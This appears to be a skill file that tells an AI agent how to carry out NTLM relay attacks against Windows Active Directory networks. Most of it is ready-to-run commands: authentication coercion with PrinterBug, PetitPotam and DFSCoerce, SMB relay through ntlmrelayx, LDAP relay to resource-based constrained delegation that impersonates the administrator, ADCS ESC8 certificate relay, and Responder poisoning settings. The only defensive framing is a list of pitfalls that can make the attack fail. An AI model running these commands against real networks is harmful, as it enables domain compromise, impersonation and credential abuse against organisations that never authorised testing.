---
name: ntlm-relay-attack
description: "NTLM relay attacks: coercion, relay targets, SMB/LDAP/HTTP relay, and mitigation bypass. Use this skill when NTLM authentication can be coerced and relayed."
---

# NTLM Relay

## Overview

Relay forwards a victim's NTLM authentication to another service, impersonating the victim without cracking anything. Requires: coercion, a target that accepts NTLM, and no signing/channel binding.

## Preconditions

- SMB signing disabled on the target
- LDAP signing/channel binding not enforced
- HTTP endpoints with NTLM auth (ADCS, Exchange, WSUS)

## Coercion methods

| Method | Command |
|---|---|
| PrinterBug | `python3 printerbug.py domain/user:pass@TARGET LISTENER` |
| PetitPotam | `python3 PetitPotam.py LISTENER TARGET` |
| DFSCoerce | `python3 dfscoerce.py -u user -p pass LISTENER TARGET` |
| CoerceAuth | `coercer.py -u user -p pass -t TARGET -l LISTENER` |

## SMB relay

```bash
# find targets without signing
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# start the relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
```

With `-socks`, use `proxychains` to interact through the relayed session.

## LDAP relay → RBCD

```bash
impacket-ntlmrelayx -t ldaps://DC -smb2support --delegate-access
# then
impacket-getST -spn cifs/target -impersonate administrator domain.local/EVIL\$:pass
```

## ADCS ESC8 relay

```bash
certipy relay -ca CA_HOST -template DomainController
python3 printerbug.py domain/user:pass@DC CA_HOST
```

## Responder interplay

Disable SMB and HTTP in Responder when relaying:

```bash
responder -I eth0 -rdw -wv
# edit Responder.conf: SMB = Off, HTTP = Off
```

## Pitfalls

- SMB signing enabled = relay fails silently.
- LDAP signing or channel binding blocks LDAPS relay.
- EPA (Extended Protection for Authentication) blocks HTTP relay to ADCS.

## Verification

The relayed session must authenticate as the victim and permit an action (share access, RBCD write, certificate issuance).
